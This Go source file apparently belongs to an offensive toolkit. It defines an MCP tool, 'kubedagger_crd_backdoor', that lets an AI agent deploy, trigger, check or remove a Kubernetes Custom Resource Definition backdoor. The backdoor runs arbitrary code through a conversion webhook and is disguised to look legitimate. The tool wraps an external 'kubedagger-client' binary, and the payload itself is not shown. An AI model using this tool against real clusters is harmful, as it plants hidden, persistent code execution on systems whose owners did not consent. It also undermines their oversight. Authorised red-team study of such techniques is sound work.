package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type CRDBackdoorInput struct {
	Action    string `json:"action"`
	Name      string `json:"name,omitempty"`
	Group     string `json:"group,omitempty"`
	Webhook   string `json:"webhook,omitempty"`
	Namespace string `json:"namespace,omitempty"`
}

type CRDBackdoorTool struct {
	exec executor.Executor
}

func NewCRDBackdoor(exec executor.Executor) *CRDBackdoorTool {
	return &CRDBackdoorTool{exec: exec}
}

func (t *CRDBackdoorTool) Name() string { return "kubedagger_crd_backdoor" }

func (t *CRDBackdoorTool) Description() string {
	return "Install a backdoor Custom Resource Definition with a conversion webhook that executes arbitrary code when custom resources are accessed. The CRD appears legitimate but its conversion webhook provides persistent code execution."
}

func (t *CRDBackdoorTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "remove", "trigger", "status"],
				"description": "CRD backdoor action"
			},
			"name": {
				"type": "string",
				"description": "CRD name to create"
			},
			"group": {
				"type": "string",
				"description": "API group for the CRD"
			},
			"webhook": {
				"type": "string",
				"description": "Webhook endpoint for conversion"
			},
			"namespace": {
				"type": "string",
				"description": "Namespace for webhook service"
			}
		},
		"required": ["action"]
	}`)
}

func (t *CRDBackdoorTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CRDBackdoorInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Name, "name"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Group, "group"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Webhook, "webhook"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"crd-backdoor", "--action", input.Action}
	if input.Name != "" {
		args = append(args, "--name", input.Name)
	}
	if input.Group != "" {
		args = append(args, "--group", input.Group)
	}
	if input.Webhook != "" {
		args = append(args, "--webhook", input.Webhook)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger crd-backdoor failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger CRD Backdoor: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Operation completed.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
